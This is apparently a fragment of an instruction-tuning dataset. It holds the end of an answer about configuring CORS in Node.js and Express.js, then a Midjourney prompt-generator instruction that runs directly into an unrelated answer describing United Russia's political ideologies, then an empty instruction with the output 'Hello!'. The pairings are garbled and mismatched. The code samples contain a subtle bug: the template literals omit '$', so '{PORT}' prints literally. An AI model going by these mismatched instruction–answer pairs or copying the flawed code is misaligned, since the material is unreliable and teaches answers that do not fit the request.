Handle other routes or methods... }); const PORT = 8000; server.listen(PORT, () => { console.log(\`Server running on port {PORT}\`); }); \`\`\` In the example above, we've added the CORS headers necessary to respond to requests from any origin (\`Access-Control-Allow-Origin: *\`). We have specified which HTTP methods are allowed with \`Access-Control-Allow-Methods\`, and which headers are allowed with \`Access-Control-Allow-Headers\`. Handling preflight requests is also important for CORS. Browsers send an \`OPTIONS\` request before sending the actual request when the request is qualified as \\"not simple\\" (for example, a request that sends custom headers, uses HTTP methods other than GET or POST, etc.). In the example, we added a condition to check if the method is \`OPTIONS\` and responded adequately. You can replace the wildcard (\`*\`) in \`Access-Control-Allow-Origin\` with specific origins to restrict access to your server to only those origins. Similarly, you can adjust the methods and headers to match the requirements of your API. For a more feature-complete solution or to avoid manual handling, you can use higher-level frameworks like Express.js, which has middleware like \`cors\` to easily configure CORS settings for your server. Here's an example using Express.js: \`\`\`javascript const express = require('express'); const cors = require('cors'); const app = express(); // Enable CORS for all routes app.use(cors()); // Routes app.get('/data', (req, res) => { res.json({ message: 'This is the response from your server.' }); }); // Start server const PORT = 8000; app.listen(PORT, () => { console.log(\`Server running on port {PORT}\`); }); \`\`\` In this Express.js example, we simply use the \`cors\` middleware, which sets up CORS headers for us, making the configuration easy and concise."},{"instruction":"As a prompt generator for a generative AI called \\"Midjourney\\", you will create image prompts for the AI to visualize.

The party's political ideologies and positions have evolved over time but are generally characterized as follows: 1. Conservatism: United Russia often espouses conservative values, emphasizing stability, traditional social norms, strong state authority, and national unity. 2. Statism: The party advocates a strong role for the state in the economy and society and has supported the expansion of state control or influence over key sectors, including the media, energy, and defense industries. 3. Pragmatism: United Russia has shown a pragmatic approach to policymaking, often prioritizing Russia's stability and economic growth over strict adherence to a particular ideology. 4. Nationalism: The party has promoted a form of Russian nationalism that seeks to enhance Russia's global standing and protect its national interests. It emphasizes patriotism and sometimes portrays Russia as a country under siege by hostile external forces. 5. Centrism: United Russia describes itself as a centrist party, attempting to appeal to a broad segment of the population by adopting a mix of policies and avoiding political extremes. 6. Sovereign democracy: This is a concept often associated with United Russia and the political technologists around Vladimir Putin's administration. Sovereign democracy emphasizes Russia's unique political system, which is deemed democratic within the context of Russian history and culture but may not necessarily align with Western democratic norms. Since Vladimir Putin's ascent to power, United Russia has been closely aligned with his leadership. The party has supported Putin's initiatives and has been a key vehicle for maintaining his political agenda. Under Putin, Russia has seen a centralization of power, and United Russia's dominance has been bolstered through political institutions, often at the expense of opposition parties and civil society. Critics argue that United Russia has contributed to the erosion of democratic institutions in Russia, the suppression of political dissent, and the manipulation of elections to maintain power. Its dominance has made it challenging for alternative political voices and movements to gain traction within Russia's political system. It is worth noting that the perceptions and manifestations of United Russia's ideologies can vary significantly and may change over time, influenced by domestic and international events. Additionally, since my knowledge is based on a cutoff date in early 2023, developments within the party and its ideological stance after that point will not be reflected here."},{"instruction":"","output":"Hello!
